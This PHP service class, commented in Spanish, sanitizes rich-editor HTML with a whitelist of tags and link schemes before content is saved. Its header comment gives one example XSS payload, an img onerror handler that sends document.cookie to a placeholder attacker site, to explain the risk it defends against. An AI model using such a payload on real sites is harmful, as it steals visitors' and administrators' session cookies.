<?php

namespace App\Services;

use Symfony\Component\HtmlSanitizer\HtmlSanitizer as SymfonyHtmlSanitizer;
use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

/**
 * Limpia el HTML que llega de los editores enriquecidos del panel.
 *
 * POR QUÉ HACE FALTA
 * ------------------
 * Los campos RichEditor de noticias, preguntas frecuentes y proyectos se
 * pintan con {!! !!}, es decir, sin escapar: si no fuera así, el texto se
 * vería con las etiquetas a la vista.
 *
 * La barra de herramientas del editor limita lo que se puede hacer con el
 * ratón, NO lo que llega al servidor. Cualquiera con acceso al panel puede
 * interceptar la petición y enviar, por ejemplo:
 *
 *     <img src=x onerror="fetch('//sitio-del-atacante/?c='+document.cookie)">
 *
 * Eso se ejecutaría en el navegador de cada visitante del portal y en el de
 * cualquier administrador que abriera esa noticia. Con este saneado, el
 * atributo onerror simplemente no sobrevive al guardado.
 *
 * CÓMO FUNCIONA
 * -------------
 * Lista blanca: solo pasan las etiquetas y atributos declarados aquí. Todo lo
 * demás se descarta. Es lo contrario de intentar "buscar lo peligroso", que
 * siempre se queda corto.
 *
 * Se sanea AL GUARDAR (en los modelos), no al mostrar: así el contenido
 * peligroso no llega siquiera a la base de datos.
 */
class HtmlSanitizer
{
    protected static ?SymfonyHtmlSanitizer $instancia = null;

    /**
     * Etiquetas permitidas en el cuerpo de un contenido, con sus atributos.
     * Es lo que ofrece la barra del editor, ni más ni menos.
     */
    protected static function configurar(): HtmlSanitizerConfig
    {
        $config = (new HtmlSanitizerConfig())
            // Texto y estructura
            ->allowElement('p')
            ->allowElement('br')
            ->allowElement('strong')
            ->allowElement('b')
            ->allowElement('em')
            ->allowElement('i')
            ->allowElement('u')
            ->allowElement('s')
            ->allowElement('sub')
            ->allowElement('sup')
            ->allowElement('blockquote')
            ->allowElement('hr')
            ->allowElement('h2')
            ->allowElement('h3')
            ->allowElement('h4')
            ->allowElement('h5')
            ->allowElement('h6')
            // Listas
            ->allowElement('ul')
            ->allowElement('ol')
            ->allowElement('li')
            // Tablas (los contenidos institucionales las usan a menudo)
            ->allowElement('table')
            ->allowElement('thead')
            ->allowElement('tbody')
            ->allowElement('tfoot')
            ->allowElement('tr')
            ->allowElement('th', ['colspan', 'rowspan', 'scope'])
            ->allowElement('td', ['colspan', 'rowspan'])
            ->allowElement('caption')
            // Enlaces e imágenes
            ->allowElement('a', ['href', 'title', 'target', 'rel'])
            ->allowElement('img', ['src', 'alt', 'title', 'width', 'height'])
            // Contenedores que genera el editor
            ->allowElement('span')
            ->allowElement('div')
            ->allowElement('code')
            ->allowElement('pre')

            // Solo estos esquemas de enlace. Deja fuera javascript: y data:,
            // que son la vía clásica para ejecutar código desde un href.
            ->allowLinkSchemes(['https', 'http', 'mailto', 'tel'])
            ->allowMediaSchemes(['https', 'http', 'data'])

            // Los enlaces salientes se abren sin pasar el referer ni dar
            // control de la pestaña de origen.
            ->forceAttribute('a', 'rel', 'noopener noreferrer')

            // Se descarta el contenido de estas etiquetas, no solo la etiqueta:
            // si no, el texto de un <script> quedaría suelto en la página.
            ->dropElement('script')
            ->dropElement('style')
            ->dropElement('iframe')
            ->dropElement('object')
            ->dropElement('embed')
            ->dropElement('form')
            ->dropElement('input')
            ->dropElement('button')
            ->dropElement('svg')
            ->dropElement('math')

            // Sin límite de longitud: hay documentos institucionales largos.
            ->withMaxInputLength(-1);

        return $config;
    }

    protected static function instancia(): SymfonyHtmlSanitizer
    {
        return self::$instancia ??= new SymfonyHtmlSanitizer(self::configurar());
    }

    /**
     * Devuelve el HTML limpio. Un null entra y sale como null, para no
     * convertir campos vacíos en cadenas vacías al guardar.
     */
    public static function limpiar(?string $html): ?string
    {
        if ($html === null || trim($html) === '') {
            return $html;
        }

        return self::instancia()->sanitize($html);
    }
}
